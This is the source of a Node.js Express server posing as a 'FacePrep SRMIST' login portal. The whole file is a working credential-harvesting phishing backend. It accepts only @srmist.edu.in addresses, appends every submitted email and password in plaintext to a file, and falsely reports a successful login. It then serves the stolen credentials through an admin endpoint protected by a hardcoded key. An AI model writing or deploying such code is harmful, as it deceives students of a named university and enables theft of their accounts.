const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Path to credentials file
const CREDENTIALS_FILE = path.join(__dirname, 'credentials.txt');

// Ensure credentials file exists
if (!fs.existsSync(CREDENTIALS_FILE)) {
    fs.writeFileSync(CREDENTIALS_FILE, '=== SRMIST Login Credentials ===\n\n');
}

// Login endpoint
app.post('/api/login', (req, res) => {
    const { email, password } = req.body;

    // Validate email format
    if (!email || !password) {
        return res.status(400).json({
            success: false,
            message: 'Email and password are required'
        });
    }

    // Check if email ends with @srmist.edu.in
    if (!email.toLowerCase().endsWith('@srmist.edu.in')) {
        return res.status(400).json({
            success: false,
            message: 'Only @srmist.edu.in email addresses are allowed'
        });
    }

    // Save credentials to file
    const timestamp = new Date().toLocaleString();
    const entry = `[${timestamp}]\nEmail: ${email}\nPassword: ${password}\n${'─'.repeat(40)}\n\n`;

    fs.appendFileSync(CREDENTIALS_FILE, entry);

    res.json({
        success: true,
        message: 'Login successful! Welcome to FacePrep SRMIST.'
    });
});

// Admin endpoint to view credentials
app.get('/api/admin/credentials', (req, res) => {
    const adminKey = req.headers['x-admin-key'];

    // Simple admin authentication
    if (adminKey !== 'srmist-admin-2024') {
        return res.status(401).json({
            success: false,
            message: 'Unauthorized access'
        });
    }

    try {
        const credentials = fs.readFileSync(CREDENTIALS_FILE, 'utf8');
        res.json({
            success: true,
            data: credentials
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Error reading credentials file'
        });
    }
});

// Serve login page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve admin page
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 FacePrep SRMIST server running at http://localhost:${PORT}`);
    console.log(`📋 Admin panel available at http://localhost:${PORT}/admin`);
});
